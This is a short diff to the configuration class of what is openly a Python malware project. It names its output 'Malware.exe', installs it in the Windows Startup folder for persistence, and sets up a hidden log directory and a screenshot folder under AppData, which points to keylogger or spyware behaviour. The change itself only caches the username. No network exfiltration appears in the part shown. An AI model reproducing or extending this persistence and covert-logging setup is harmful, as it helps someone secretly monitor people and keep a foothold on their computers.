@@ -6,11 +6,12 @@ from os import path
 class Configuration:
 
     def __init__(self):
-        #ABSOLUTE FILE PATHS
+        #ABSOLUTE FILE PATHS AND USER DATA
+            self.__userName = getpass.getuser()
             self.__fileName = 'Malware.exe'
-            self.__filePath = f'c:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
+            self.__filePath = f'c:\\Users\\{self.__userName}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
             self.__logFileName = 'log.txt'
-            self.__logPath = f'c:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\tempData\\'
+            self.__logPath = f'c:\\Users\\{self.__userName}\\AppData\\Roaming\\tempData\\'
             self.__screenshotPath = self.__logPath + 'pics\\'
             self.__currentDir = path.dirname(sys.executable)
             self.__currentPath = self.__currentDir + f'\\{self.__fileName}'
